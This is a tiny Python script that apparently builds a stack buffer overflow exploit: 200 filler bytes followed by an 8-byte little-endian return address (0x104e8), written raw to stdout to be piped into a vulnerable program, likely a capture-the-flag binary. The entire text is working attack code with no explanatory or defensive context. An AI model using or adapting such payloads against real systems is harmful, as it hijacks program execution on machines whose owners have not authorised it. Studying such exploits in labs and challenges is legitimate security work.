import sys

payload = b'A' * 200 + (0x104e8).to_bytes(8, 'little')

sys.stdout.buffer.write(payload)
